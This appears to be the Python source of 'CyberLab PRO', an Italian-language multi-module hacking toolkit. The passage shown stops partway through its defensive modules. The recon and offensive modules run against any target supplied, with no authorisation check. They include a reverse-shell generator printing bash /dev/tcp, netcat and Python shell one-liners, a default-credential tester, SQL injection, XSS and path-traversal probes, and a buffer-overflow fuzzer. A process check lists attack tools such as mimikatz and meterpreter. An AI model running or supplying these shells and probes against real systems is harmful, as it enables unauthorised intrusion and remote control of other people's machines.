#!/usr/bin/env python3
# CyberLab PRO v4.4 - 170 moduli (Layout Responsivo Adattivo)
import os,sys,re,ssl,socket,subprocess,hashlib,base64,hmac,secrets,json,time
import shutil,platform,random,string,threading,glob,zipfile,sqlite3,struct,tempfile
import getpass,urllib.request,urllib.parse,urllib.error,http.server,socketserver,gzip
try: sys.stdout.reconfigure(line_buffering=True)
except Exception: pass

MODULES_MAP={
1:("TCP SYN Port Scanner","RECON"),2:("UDP Service Prober","RECON"),
3:("DNS Enumeration & MX","RECON"),4:("Subdomain Brute-Forcer","RECON"),
5:("ASN & IP Range Lookup","RECON"),6:("Banner Grabbing","RECON"),
7:("WHOIS Intelligence","RECON"),8:("HTTP Headers Auditor","RECON"),
9:("SSL/TLS Cipher Audit","RECON"),10:("Traceroute Path Hop","RECON"),
11:("Local Host Discovery","RECON"),12:("Ping Sweep Probe","RECON"),
13:("Web Spider & Crawler","RECON"),14:("DNS Zone Transfer","RECON"),
15:("GeoIP & ISP Resolver","RECON"),
16:("Directory Fuzzer","OFFENSIVE"),17:("Web Form Input Check","OFFENSIVE"),
18:("Default Creds Tester","OFFENSIVE"),19:("CORS Misconfig Audit","OFFENSIVE"),
20:("Security Headers Scan","OFFENSIVE"),21:("SQLi Payload Fuzzer","OFFENSIVE"),
22:("Reflected XSS Check","OFFENSIVE"),23:("LFI Simulator","OFFENSIVE"),
24:("API Endpoint Discovery","OFFENSIVE"),25:("JWT Token Auditor","OFFENSIVE"),
26:("HTTP Param Pollution","OFFENSIVE"),27:("Subdomain Takeover","OFFENSIVE"),
28:("AWS S3 Bucket Check","OFFENSIVE"),29:("Webhook Relay Test","OFFENSIVE"),
30:("Rate Limiting Shield","OFFENSIVE"),
31:("Reverse Shell Generator","OFFENSIVE"),32:("Privilege Escalation Check","OFFENSIVE"),
33:("Cron Job Permissions","OFFENSIVE"),34:("Registry Run-Key Audit","OFFENSIVE"),
35:("SUID/SGID Binary Scan","OFFENSIVE"),36:("Buffer Overflow Fuzz","OFFENSIVE"),
37:("Shellcode Encoder","OFFENSIVE"),38:("ARP Spoofing Detect","OFFENSIVE"),
39:("DHCP Starvation Test","OFFENSIVE"),40:("DNS Poisoning Probe","OFFENSIVE"),
41:("Netcat Bind/Reverse","OFFENSIVE"),42:("Hash Cracker (MD5/SHA)","OFFENSIVE"),
43:("Keylogger Sim","OFFENSIVE"),44:("Lateral Movement Map","OFFENSIVE"),
45:("Active Directory ACL","OFFENSIVE"),
46:("File Integrity Mon (FIM)","DEFENSIVE"),47:("Process Anomaly Finder","DEFENSIVE"),
48:("System Log Watcher","DEFENSIVE"),49:("SQLite Telemetry Engine","DEFENSIVE"),
50:("Network Connection Audit","DEFENSIVE"),51:("Firewall Rules Check","DEFENSIVE"),
52:("SSH/GPG Key Verifier","DEFENSIVE"),53:("User Session Auditor","DEFENSIVE"),
54:("DNS Cache Integrity","DEFENSIVE"),55:("Auto System Config Backup","DEFENSIVE"),
56:("Service Health Watchdog","DEFENSIVE"),57:("Honeytoken Deployment","DEFENSIVE"),
58:("Memory & CPU Telemetry","DEFENSIVE"),59:("Threat Intel Parser","DEFENSIVE"),
60:("Startup App Auditor","DEFENSIVE"),61:("Kernel Module Verifier","DEFENSIVE"),
62:("Open Socket Monitor","DEFENSIVE"),63:("Suspicious Webhook Intercept","DEFENSIVE"),
64:("Bandwidth Analyzer","DEFENSIVE"),65:("Incident Evidence Collector","DEFENSIVE"),
66:("Docker Escape Check","CLOUD"),67:("Kubernetes API Exposure","CLOUD"),
68:("Terraform Secret Scan","CLOUD"),69:("Cloud Metadata Probe","CLOUD"),
70:("CI/CD Pipeline Audit","CLOUD"),71:("Ansible Playbook Check","CLOUD"),
72:("Nginx Proxy Linter","CLOUD"),73:("Apache Server Harden","CLOUD"),
74:("Redis Open Instance","CLOUD"),75:("MongoDB NoAuth Probe","CLOUD"),
76:("SQL Database Audit","CLOUD"),77:("Env Variable Leak Check","CLOUD"),
78:("SSL Cert Expiry Verifier","CLOUD"),
79:("AES-256 Encrypt/Decrypt","CRYPTO"),80:("RSA Key Pair Generator","CRYPTO"),
81:("SHA-256 Hash Generator","CRYPTO"),82:("Base64/Hex Codec","CRYPTO"),
83:("Entropy Password Gen","CRYPTO"),84:("JWT Token Signer","CRYPTO"),
85:("Password Strength Anal","CRYPTO"),86:("Digital Signature Verify","CRYPTO"),
87:("Salted Hash Compare","CRYPTO"),88:("Encrypted Vault Manager","CRYPTO"),
89:("SQLite Shell Viewer","UTILS"),90:("Performance Benchmark","UTILS"),
91:("Disk Space & Inode Mon","UTILS"),92:("Automated Git Check","UTILS"),
93:("JSON/YAML Formatter","UTILS"),94:("Log Rotator & Compressor","UTILS"),
95:("Port Forward Utility","UTILS"),96:("Simple HTTP Test Server","UTILS"),
97:("Webhook Relay Utility","UTILS"),98:("Terminal Recorder","UTILS"),
99:("Diagnostics Gatherer","UTILS"),100:("Suite Health Check","UTILS"),
101:("Wi-Fi Beacon Flood Sim","WIRELESS"),102:("BLE Device Scanner","WIRELESS"),
103:("WPA Handshake Verify","WIRELESS"),104:("RTL-SDR Signal Detect","WIRELESS"),
105:("Deauth Packet Probe","WIRELESS"),106:("WPS Vulnerability Check","WIRELESS"),
107:("Bluetooth Spoof Check","WIRELESS"),108:("RF Noise Floor Analyzer","WIRELESS"),
109:("Monitor Mode Verifier","WIRELESS"),110:("Zigbee/IoT Protocol Audit","WIRELESS"),
111:("Evil Twin AP Detector","WIRELESS"),112:("Probe Request Logger","WIRELESS"),
113:("GPS Spoofing Detector","WIRELESS"),114:("NFC Tag UID Cloner","WIRELESS"),
115:("Infrared Replay Analyze","WIRELESS"),116:("LoRaWAN Packet Inspect","WIRELESS"),
117:("Honeypot SSID Broadcaster","WIRELESS"),118:("Channel Congestion Meter","WIRELESS"),
119:("Rogue AP Triangulation","WIRELESS"),120:("Wireless Security Rating","WIRELESS"),
121:("Firmware Magic Parser","IOT"),122:("UART Pinout Mapper","IOT"),
123:("JTAG Boundary Scan Sim","IOT"),124:("Embedded Web Cred Audit","IOT"),
125:("UPnP Device Discovery","IOT"),126:("Modbus/ICS Traffic Probe","IOT"),
127:("MQTT Anon Access Check","IOT"),128:("CoAP Endpoint Enum","IOT"),
129:("Router Telnet Checker","IOT"),130:("SNMP Community Fuzzer","IOT"),
131:("Embedded Key Extractor","IOT"),132:("NVRAM Config Extractor","IOT"),
133:("IP Camera RTSP Check","IOT"),134:("Smart Meter Profile Audit","IOT"),
135:("Hardware Watchdog Check","IOT"),
136:("RAM Image Entropy Anal","FORENSICS"),137:("Process String Extractor","FORENSICS"),
138:("Socket Artifact Parser","FORENSICS"),139:("MFT File Record Anal","FORENSICS"),
140:("Browser History Forensics","FORENSICS"),141:("Prefetch Timeline Anal","FORENSICS"),
142:("Registry Hive Parser","FORENSICS"),143:("Bash/Cron Forensics","FORENSICS"),
144:("USB Connection History","FORENSICS"),145:("YARA Rule Matcher","FORENSICS"),
146:("PE File Header Inspect","FORENSICS"),147:("Office Macro Extractor","FORENSICS"),
148:("Zip Bomb Detector","FORENSICS"),149:("Partition Table Inspect","FORENSICS"),
150:("Chain-of-Custody Ledger","FORENSICS"),
151:("Phone OSINT Lookup","OSINT"),152:("Email OSINT Lookup","OSINT"),
153:("Username OSINT Search","OSINT"),154:("Email Breach Check","OSINT"),
155:("Phone Carrier Verify","OSINT"),156:("Gravatar Profile Finder","OSINT"),
157:("Email to Accounts (Holehe)","OSINT"),158:("Name/Surname Search","OSINT"),
159:("Phone to Social Footprint","OSINT"),160:("OSINT Aggregator","OSINT"),
161:("Test: BSOD Screen Simulation","TEST"),162:("Test: Antivirus Alert Simulation","TEST"),
163:("Test: File Deletion Simulation","TEST"),164:("Test: Hacking Terminal Simulation","TEST"),
165:("Test: Ransomware Screen Simulation","TEST"),166:("Test: Update Progress Simulation","TEST"),
167:("Test: Matrix Rain Display","TEST"),168:("Test: Error Spam Simulation","TEST"),
169:("Test: Rickroll Display","TEST"),170:("Test: Disk Format Screen Simulation","TEST"),
}

NO_INPUT_MODULES = {
    11, 39, 43, 47, 48, 50, 51, 53, 54, 56, 58, 60, 61, 62, 64, 66,
    83, 90, 98, 99, 100,
    101, 102, 104, 105, 106, 107, 108, 109, 110,
    112, 113, 114, 115, 116, 117, 118, 119, 120,
    122, 123, 125, 132, 134, 135,
    138, 140, 141, 143, 144,
    161, 162, 163, 164, 165, 166, 167, 168, 169, 170,
}

CUSTOM_PROMPTS = {
    37:  "Payload da codificare", 42:  "Formato <hash>:<path_wordlist>",
    63:  "Porta su cui ascoltare (es. 8080)", 79:  "Testo da cifrare (AES)",
    81:  "Testo da hashare (SHA-256)", 82:  "Testo da codificare (Base64/Hex)",
    84:  "Subject del JWT", 85:  "Password da analizzare",
    86:  "Formato <messaggio>:<firma_hex>", 87:  "Stringa da hashare con salt",
    88:  "Testo da cifrare (vault)", 89:  "Path file SQLite .db",
    91:  "Path del disco (INVIO per /)", 93:  "JSON raw oppure path a file .json",
    94:  "Path file da comprimere", 95:  "Formato <lport>:<rhost,rport>",
    96:  "Porta del server HTTP (INVIO per 8000)", 97:  "URL webhook completo",
    121: "Path file firmware", 131: "Path file firmware",
    136: "Path immagine RAM / dump", 137: "Path dump/processo",
    145: "Path file regole YARA-like", 146: "Path file PE (.exe/.dll)",
    147: "Path documento (docx/xlsx)", 148: "Path file zip",
    149: "Path device o immagine disco", 150: "Path log catena (INVIO per default)",
    151: "Numero di telefono (E.164, es. +39...)", 152: "Indirizzo email",
    153: "Username (senza @)", 154: "Indirizzo email", 155: "Numero di telefono",
    156: "Indirizzo email", 157: "Indirizzo email", 158: "Nome e cognome",
    159: "Numero di telefono", 160: "Email / telefono / username",
}

def get_prompt(mod_id):
    if mod_id in NO_INPUT_MODULES: return None
    if mod_id in CUSTOM_PROMPTS: return CUSTOM_PROMPTS[mod_id]
    return "Target (host / IP / URL / dominio)"

class MegaEngine:
    TIMEOUT=3; UA="Mozilla/5.0 CyberLab/4.4"
    COMMON_TCP=[21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1521,
                1723,3306,3389,5432,5900,6379,8080,8443,27017]
    def __init__(self): self.os=platform.system()
    def ok(self,m): print(f"[+] {m}")
    def warn(self,m): print(f"[!] {m}")
    def info(self,m): print(f"[i] {m}")
    def err(self,m): print(f"[x] {m}")
    def sim(self,m): print(f"[SIM] {m}")
    def host(self,t): return (t.split("://")[-1].split("/")[0].split(":")[0] or "127.0.0.1")
    def resolve(self,h):
        try: return socket.gethostbyname(h)
        except Exception as e: self.err(f"Risoluzione fallita: {e}"); return None
    def probe_tcp(self,ip,port,to=None):
        try:
            s=socket.socket(); s.settimeout(to or self.TIMEOUT)
            r=s.connect_ex((ip,port)); s.close(); return r==0
        except Exception: return False
    def http(self,url,method="GET",headers=None,data=None,to=None):
        try:
            req=urllib.request.Request(url,data=data,method=method)
            req.add_header("User-Agent",self.UA)
            for k,v in (headers or {}).items(): req.add_header(k,v)
            r=urllib.request.urlopen(req,timeout=to or self.TIMEOUT,
                                     context=ssl._create_unverified_context())
            return {"status":r.status,"headers":dict(r.getheaders()),
                    "body":r.read(65536).decode("utf-8","ignore"),"url":r.geturl()}
        except urllib.error.HTTPError as e:
            b=b""
            try: b=e.read(65536)
            except Exception: pass
            return {"status":e.code,"headers":dict(e.headers),
                    "body":b.decode("utf-8","ignore"),"url":url}
        except Exception as e: return {"error":str(e)}

    def dispatch(self,mid,t):
        if 1<=mid<=15: self.run_recon(mid,t)
        elif 16<=mid<=30: self.run_web(mid,t)
        elif 31<=mid<=45: self.run_offensive(mid,t)
        elif 46<=mid<=65: self.run_defensive(mid,t)
        elif 66<=mid<=78: self.run_cloud(mid,t)
        elif 79<=mid<=88: self.run_crypto(mid,t)
        elif 89<=mid<=100: self.run_utils(mid,t)
        elif 101<=mid<=120: self.run_wireless(mid,t)
        elif 121<=mid<=135: self.run_iot(mid,t)
        elif 136<=mid<=150: self.run_forensics(mid,t)
        elif 151<=mid<=160: self.run_osint(mid,t)
        elif 161<=mid<=170: self.run_simulation(mid,t)
        else: self.err("Modulo fuori range 1-170")

    def run_recon(self,m,t):
        h=self.host(t)
        if m==1:
            ip=self.resolve(h) or h; opens=[p for p in self.COMMON_TCP if self.probe_tcp(ip,p,1)]
            for p in opens: self.ok(f"Porta {p} APERTA")
            self.info(f"Totale: {len(opens)} porte")
        elif m==2:
            ip=self.resolve(h) or h
            for p in [53,67,69,123,137,161,500,514,1900,5353]:
                try:
                    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.settimeout(0.4)
                    s.sendto(b"\x00",(ip,p))
                    try: s.recvfrom(1024); self.ok(f"UDP {p} risponde")
                    except socket.timeout: pass
                    s.close()
                except Exception: pass
        elif m==3:
            try:
                ip=socket.gethostbyname(h); self.ok(f"A: {ip}")
                r=subprocess.run(["nslookup","-type=MX",h],capture_output=True,text=True,timeout=5)
                for line in r.stdout.splitlines():
                    if "mail exchanger" in line.lower(): print("   ",line.strip())
            except Exception as e: self.err(str(e))
        elif m==4:
            for s in ["www","mail","ftp","admin","api","dev","test","staging","blog","vpn"]:
                try: socket.gethostbyname(f"{s}.{h}"); self.ok(f"{s}.{h}")
                except Exception: pass
        elif m==5:
            ip=self.resolve(h) or h
            r=self.http(f"http://ip-api.com/json/{ip}?fields=status,as,isp,country,query")
            if "body" in r:
                try:
                    for k,v in json.loads(r["body"]).items(): self.info(f"{k}: {v}")
                except Exception: pass
        elif m==6:
            ip=self.resolve(h) or h
            for p in [21,22,25,80,110,143,443,8080]:
                if not self.probe_tcp(ip,p,1): continue
                try:
                    s=socket.socket(); s.settimeout(2); s.connect((ip,p))
                    if p in (80,8080): s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    b=s.recv(512).decode("utf-8","ignore").strip().splitlines()
                    if b: self.ok(f"{p}: {b[0][:100]}")
                    s.close()
                except Exception: pass
        elif m==7:
            ip=self.resolve(h) or h
            r=self.http(f"https://rdap.org/ip/{ip}")
            if r.get("status")==200:
                try:
                    d=json.loads(r["body"])
                    for k in ("name","handle","country","startAddress"):
                        if k in d: self.info(f"{k}: {d[k]}")
                except Exception: pass
        elif m==8:
            r=self.http(t if t.startswith("http") else f"http://{t}")
            if "headers" in r:
                self.ok(f"Status: {r['status']}")
                for k,v in r["headers"].items(): print(f"    {k}: {v}")
        elif m==9:
            ip=self.resolve(h) or h
            try:
                ctx=ssl.create_default_context()
                with socket.create_connection((ip,443),timeout=5) as sock:
                    with ctx.wrap_socket(sock,server_hostname=h) as ss:
                        self.ok(f"TLS {ss.version()}"); self.info(f"Cipher: {ss.cipher()}")
                        c=ss.getpeercert()
                        if c: self.info(f"Scadenza: {c.get('notAfter','?')}")
            except Exception as e: self.err(str(e))
        elif m==10:
            cmd=["tracert","-h","15",h] if self.os=="Windows" else ["traceroute","-m","15",h]
            try:
                r=subprocess.run(cmd,capture_output=True,text=True,timeout=60)
                print((r.stdout or r.stderr)[:2000])
            except FileNotFoundError: self.warn("traceroute non installato")
            except Exception as e: self.err(str(e))
        elif m==11:
            cmd=["arp","-a"] if self.os=="Windows" else ["arp","-an"]
            try:
                print(subprocess.run(cmd,capture_output=True,text=True,timeout=10).stdout[:2000])
            except Exception as e: self.err(str(e))
        elif m==12:
            ip=self.resolve(h) or h; base=ip.rsplit(".",1)[0]+"."
            param="-n" if self.os=="Windows" else "-c"
            for i in range(1,31):
                cmd=["ping",param,"1",base+str(i)]
                try:
                    if subprocess.run(cmd,capture_output=True,timeout=2).returncode==0:
                        self.ok(f"{base}{i} UP")
                except Exception: pass
        elif m==13:
            r=self.http(t if t.startswith("http") else f"http://{t}")
            if "body" in r:
                links=re.findall(r'href=["\']([^"\']+)["\']',r["body"])[:40]
                self.info(f"Link: {len(links)}")
                for l in links: print(f"    {l}")
        elif m==14:
            ns=[]
            try:
                r=subprocess.run(["nslookup","-type=NS",h],capture_output=True,text=True,timeout=5)
                ns=re.findall(r"nameserver\s*=\s*(\S+)",r.stdout)
            except Exception: pass
            if not ns: self.warn("Nameserver non trovati"); return
            for srv in ns[:3]:
                srv=srv.strip("."); self.info(f"Tentativo AXFR su {srv}")
                try:
                    r=subprocess.run(["nslookup","-type=any",h,srv],capture_output=True,text=True,timeout=6)
                    if "Address" in r.stdout: print(r.stdout[:600])
                except Exception: pass
        elif m==15:
            ip=self.resolve(h) or h
            r=self.http(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,query")
            if "body" in r:
                try:
                    for k,v in json.loads(r["body"]).items(): self.info(f"{k}: {v}")
                except Exception: pass

    def run_web(self,m,t):
        base=t if t.startswith("http") else f"http://{t}"
        if m==16:
            for p in ["admin","login","wp-admin","api","config","backup","robots.txt",".env","phpinfo.php"]:
                r=self.http(f"{base.rstrip('/')}/{p}")
                if r.get("status") in (200,301,302,401,403): self.ok(f"/{p} -> {r['status']}")
        elif m==17:
            pl="cyberlab<test>"
            r=self.http(f"{base}?q={urllib.parse.quote(pl)}")
            if pl in r.get("body",""): self.warn("Riflessione input rilevata")
            else: self.ok("Nessuna riflessione")
        elif m==18:
            for u,p in [("admin","admin"),("admin","password"),("root","root"),("user","user")]:
                req=urllib.request.Request(base)
                req.add_header("Authorization","Basic "+base64.b64encode(f"{u}:{p}".encode()).decode())
                req.add_header("User-Agent",self.UA)
                try:
                    r=urllib.request.urlopen(req,timeout=2,context=ssl._create_unverified_context())
                    if r.status==200: self.warn(f"Funziona {u}:{p}")
                except Exception: pass
            self.info("Test completato")
        elif m==19:
            r=self.http(base,headers={"Origin":"https://evil.example"})
            acao=r.get("headers",{}).get("Access-Control-Allow-Origin","")
            if acao in ("*","https://evil.example"): self.warn(f"CORS permissivo: {acao}")
            else: self.ok(f"CORS ok: {acao or 'assente'}")
        elif m==20:
            r=self.http(base)
            hdr={k.lower():v for k,v in r.get("headers",{}).items()}
            for k,n in {"strict-transport-security":"HSTS","content-security-policy":"CSP",
                        "x-frame-options":"XFO","x-content-type-options":"XCTO",
                        "referrer-policy":"RP","permissions-policy":"PP"}.items():
                if k in hdr: self.ok(f"{n}: presente")
                else: self.warn(f"{n}: MANCANTE")
        elif m==21:
            for p in ["'","1' OR '1'='1","1' UNION SELECT NULL--"]:
                r=self.http(f"{base}?id={urllib.parse.quote(p)}",to=4)
                if any(x in r.get("body","").lower() for x in ["sql syntax","mysql","ora-","syntax error"]):
                    self.warn(f"Payload '{p}' -> possibile SQLi")
        elif m==22:
            pl="<script>alert(1)</script>"
            r=self.http(f"{base}?q={urllib.parse.quote(pl)}")
            if pl in r.get("body",""): self.warn("XSS riflesso")
            else: self.ok("Nessuna riflessione XSS")
        elif m==23:
            for p in ["../../../../etc/passwd","..\\..\\..\\windows\\win.ini"]:
                r=self.http(f"{base}?file={urllib.parse.quote(p)}")
                if "root:x:" in r.get("body","") or "[extensions]" in r.get("body",""):
                    self.warn(f"LFI con {p}"); return
            self.ok("Nessun LFI")
        elif m==24:
            for p in ["api","api/v1","swagger.json","openapi.json","graphql","health"]:
                r=self.http(f"{base.rstrip('/')}/{p}")
                if r.get("status") in (200,401,403,405): self.ok(f"/{p} -> {r['status']}")
        elif m==25:
            if t.count(".")==2:
                for i,nm in enumerate(("Header","Payload")):
                    try:
                        pad=t.split(".")[i]+"="*(-len(t.split(".")[i])%4)
                        self.info(f"{nm}: {base64.urlsafe_b64decode(pad).decode()}")
                    except Exception: pass
            else: self.warn("Formato JWT non valido")
        elif m==26:
            r=self.http(f"{base}?role=user&role=admin&role=guest")
            self.info(f"Param pollution -> {r.get('status')}")
        elif m==27:
            r=self.http(base)
            for s in ["There isn't a GitHub Pages site","NoSuchBucket","No such app","not configured"]:
                if s in r.get("body",""): self.warn(f"Firma takeover: '{s}'"); return
            self.ok("Nessuna firma takeover")
        elif m==28:
            for url in (f"https://{t}.s3.amazonaws.com",f"http://{t}.s3.amazonaws.com"):
                r=self.http(url,to=4)
                if r.get("status")==200: self.warn(f"Bucket pubblico: {url}")
                elif r.get("status")==403: self.info("Esiste ma protetto")
                elif r.get("status")==404: self.info("Non esiste")
        elif m==29:
            if not t.startswith("http"): self.warn("URL webhook richiesto"); return
            body=json.dumps({"tool":"CyberLab","ts":time.time()}).encode()
            r=self.http(t,method="POST",data=body,headers={"Content-Type":"application/json"},to=5)
            if "error" in r: self.err(r["error"])
            else: self.ok(f"Status {r['status']}")
        elif m==30:
            times=[]
            for _ in range(10):
                t0=time.time(); self.http(base,to=5); times.append(time.time()-t0)
            avg=sum(times)/len(times)
            self.info(f"Media {avg*1000:.0f}ms min {min(times)*1000:.0f} max {max(times)*1000:.0f}")
            if max(times)>avg*3: self.warn("Possibile rate limiting")

    def run_offensive(self,m,t):
        if m==31:
            print(f"bash: bash -i >& /dev/tcp/{t}/4444 0>&1")
            print(f"nc:   nc -e /bin/sh {t} 4444")
            print(f"py:   python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{t}\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'")
        elif m==32:
            try:
                if self.os=="Windows":
                    print(subprocess.run(["whoami","/priv"],capture_output=True,text=True,timeout=5).stdout[:800])
                else:
                    r=subprocess.run(["sudo","-n","-l"],capture_output=True,text=True,timeout=5)
                    print(r.stdout[:500] or r.stderr[:200])
                    r=subprocess.run(["getcap","-r","/"],capture_output=True,text=True,timeout=5)
                    if r.stdout: self.warn(f"Capabilities: {r.stdout[:300]}")
            except Exception as e: self.err(str(e))
        elif m==33:
            if self.os=="Windows":
                try: print(subprocess.run(["schtasks","/query"],capture_output=True,text=True,timeout=10).stdout[:1500])
                except Exception: pass
            else:
                for p in ["/etc/crontab","/etc/cron.d"]:
                    if os.path.exists(p): self.info(f"{p} mode={oct(os.stat(p).st_mode)[-4:]}")
                try: print(subprocess.run(["crontab","-l"],capture_output=True,text=True,timeout=5).stdout[:800])
                except Exception: pass
        elif m==34:
            if self.os!="Windows": self.warn("Solo Windows"); return
            try:
                import winreg
                for root,path in [(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Run"),
                                 (winreg.HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")]:
                    try:
                        k=winreg.OpenKey(root,path); i=0
                        while True:
                            try: n,v,_=winreg.EnumValue(k,i); self.ok(f"{n} = {v}"); i+=1
                            except OSError: break
                    except Exception: pass
            except Exception as e: self.err(str(e))
        elif m==35:
            if self.os=="Windows": self.warn("Solo Linux/Unix"); return
            try:
                r=subprocess.run(["find","/","-perm","-4000","-type","f"],capture_output=True,text=True,timeout=20)
                for l in r.stdout.splitlines()[:30]: self.ok(l)
            except Exception as e: self.err(str(e))
        elif m==36:
            ip=t
            if not self.probe_tcp(ip,80,2): self.warn("Porta 80 chiusa"); return
            for sz in (100,1000,5000):
                try:
                    s=socket.socket(); s.settimeout(2); s.connect((ip,80))
                    s.send(b"A"*sz); resp=s.recv(1024); s.close()
                    self.info(f"size={sz}: {len(resp)} byte")
                except Exception: pass
        elif m==37:
            pl=t.encode() if t else b"test"
            self.ok(f"Base64: {base64.b64encode(pl).decode()}")
            self.ok(f"Hex: {pl.hex()}")
        elif m==38:
            try:
                r=subprocess.run(["arp","-a"] if self.os=="Windows" else ["arp","-an"],capture_output=True,text=True,timeout=5)
                from collections import Counter
                macs=re.findall(r"([0-9a-f:]{17})",r.stdout.lower())
                bad=[x for x,c in Counter(macs).items() if c>1]
                if bad: [self.warn(f"MAC duplicato: {x}") for x in bad]
                else: self.ok("Nessuna anomalia MAC")
            except Exception as e: self.err(str(e))
        elif m==39:
            self.sim("DHCP starvation richiede raw socket e privilegi root")
            try: print(subprocess.run(["ip","-brief","addr"] if self.os!="Windows" else ["ipconfig"],capture_output=True,text=True,timeout=5).stdout[:800])
            except Exception: pass
        elif m==40:
            try:
                a=socket.gethostbyname(t)
                r=subprocess.run(["nslookup",t],capture_output=True,text=True,timeout=5)
                addrs=re.findall(r"Address:\s*(\S+)",r.stdout)
                self.info(f"Resolver Python: {a}")
                self.info(f"Resolver sistema: {addrs[:3]}")
                if addrs and a not in addrs: self.warn("Discrepanza DNS rilevata")
            except Exception as e: self.err(str(e))
        elif m==41:
            for p in [4444,5555,6666,7777,9001]:
                if self.probe_tcp(t,p,1): self.ok(f"Listener su porta {p}")
        elif m==42:
            parts=t.split(":",1)
            if len(parts)!=2: self.warn("Formato: <hash>:<wordlist>"); return
            h,path=parts
            if not os.path.exists(path): self.warn("Wordlist non trovata"); return
            algo="md5" if len(h)==32 else "sha1" if len(h)==40 else "sha256" if len(h)==64 else None
            if not algo: self.warn("Hash non riconosciuto"); return
            for i,line in enumerate(open(path,"rb")):
                w=line.strip()
                if hashlib.new(algo,w).hexdigest()==h.lower():
                    self.ok(f"Match trovato: {w.decode('latin1')}"); return
                if i>2000000: break
            self.warn("Nessun match")
        elif m==43:
            self.sim("Keylogger non implementato - nessun tasto registrato")
            log=os.path.join(tempfile.gettempdir(),"cyberlab_keylog_test.txt")
            open(log,"w").write("[TEST] nessuna registrazione effettuata\n"); self.ok(f"File creato: {log}")
        elif m==44:
            ip=self.resolve(t) or t; base=ip.rsplit(".",1)[0]+"."
            for i in range(1,21):
                if self.probe_tcp(base+str(i),445,0.3) or self.probe_tcp(base+str(i),22,0.3):
                    self.ok(f"{base}{i} SMB/SSH aperto")
        elif m==45:
            if self.os!="Windows": self.warn("Solo Windows domain"); return
            try: print(subprocess.run(["powershell","-Command","Get-Acl | Format-List"],capture_output=True,text=True,timeout=10).stdout[:1000])
            except Exception as e: self.err(str(e))

    def run_defensive(self,m,t):
        if m==46:
            p=t if os.path.isdir(t) else "."; n=0
            for root,_,files in os.walk(p):
                for f in files[:20]:
                    fp=os.path.join(root,f)
                    try:
                        h=hashlib.sha256(open(fp,"rb").read()).hexdigest()[:16]
                        print(f"   {h} {fp}"); n+=1
                    except Exception: pass
                if n>=20: break
        elif m==47:
            flag=["nc","netcat","mimikatz","meterpreter","beacon"]
            try:
                cmd=["tasklist"] if self.os=="Windows" else ["ps","-eo","pid,comm"]
                r=subprocess.run(cmd,capture_output=True,text=True,timeout=10)
                for line in r.stdout.splitlines():
                    if any(f in line.lower() for f in flag): self.warn(line)
            except Exception: pass
        elif m==48:
            for p in ["/var/log/syslog","/var/log/auth.log","/var/log/messages"]:
                if os.path.exists(p):
                    try: print("".join(open(p,errors="ignore").readlines()[-15:])); return
                    except Exception: pass
            if self.os=="Windows":
                try: print(subprocess.run(["wevtutil","qe","System","/c:10","/f:text"],capture_output=True,text=True,timeout=8).stdout[:1500])
                except Exception: pass
        elif m==49:
            db=t if t.endswith(".db") else "cyberlab_telemetry.db"
            try:
                c=sqlite3.connect(db)
                c.execute("CREATE TABLE IF NOT EXISTS events(ts REAL,module TEXT)")
                c.execute("INSERT INTO events VALUES(?,?)",(time.time(),"dispatch")); c.commit()
                for r in c.execute("SELECT * FROM events ORDER BY ts DESC LIMIT 5"): print("  ",r)
                c.close()
            except Exception as e: self.err(str(e))
        elif m==50:
            cmd=["netstat","-ano"] if self.os=="Windows" else ["ss","-tunap"]
            try: print(subprocess.run(cmd,capture_output=True,text=True,timeout=10).stdout[:2000])
            except Exception: pass
        elif m==51:
            cmd=["netsh","advfirewall","show","allprofiles"] if self.os=="Windows" else ["iptables","-L","-n"]
            try: print(subprocess.run(cmd,capture_output=True,text=True,timeout=10).stdout[:1500])
            except Exception: pass
        elif m==52:
            sshdir=os.path.expanduser("~/.ssh")
            if os.path.isdir(sshdir):
                for f in os.listdir(sshdir)[:10]:
                    print(f"   {f} {oct(os.stat(os.path.join(sshdir,f)).st_mode)[-4:]}")
        elif m==53:
            try: print(subprocess.run(["quser"] if self.os=="Windows" else ["who"],capture_output=True,text=True,timeout=5).stdout[:800])
            except Exception: pass
        elif m==54:
            cmd=["ipconfig","/displaydns"] if self.os=="Windows" else ["resolvectl","statistics"]
            try: print(subprocess.run(cmd,capture_output=True,text=True,timeout=8).stdout[:1000])
            except Exception: pass
        elif m==55:
            dest=t or tempfile.mkdtemp(prefix="cyberlab_backup_"); os.makedirs(dest,exist_ok=True)
            for src in ("/etc/hosts","/etc/resolv.conf"):
                if os.path.exists(src):
                    try: shutil.copy2(src,dest); self.ok(src)
                    except Exception: pass
        elif m==56:
            cmd=["sc","query"] if self.os=="Windows" else ["systemctl","--no-pager","list-units","--failed"]
            try: print(subprocess.run(cmd,capture_output=True,text=True,timeout=10).stdout[:1000])
            except Exception: pass
        elif m==57:
            dest=t or tempfile.mkdtemp(prefix="cyberlab_honey_"); os.makedirs(dest,exist_ok=True)
            for n in ("credentials.txt","aws_keys.csv"):
                fp=os.path.join(dest,n)
                open(fp,"w").write(f"DECOY honeytoken {secrets.token_hex(8)}\n"); self.ok(fp)
        elif m==58:
            if os.path.exists("/proc/meminfo"):
                print("".join(open("/proc/meminfo").readlines()[:5]))
                print(open("/proc/loadavg").read())
        elif m==59:
            if not os.path.exists(t): self.warn("File IOC richiesto"); return
            iocs=set()
            for line in open(t,errors="ignore"):
                for tok in re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b|[a-fA-F0-9]{32,64}",line): iocs.add(tok)
            for i in list(iocs)[:40]: print("   ",i)
            self.info(f"Totale IOC: {len(iocs)}")
        elif m==60:
            if self.os=="Windows":
                try: print(subprocess.run(["wmic","startup","get","Caption,Command"],capture_output=True,text=True,timeout=10).stdout[:1000])
                except Exception: pass
            else:
                for d in ("/etc/init.d","/etc/rc.local"):
                    if os.path.exists(d): self.info(f"{d} presente")
        elif m==61:
            try: print(subprocess.run(["lsmod"] if self.os!="Windows" else ["driverquery"],capture_output=True,text=True,timeout=8).stdout[:1500])
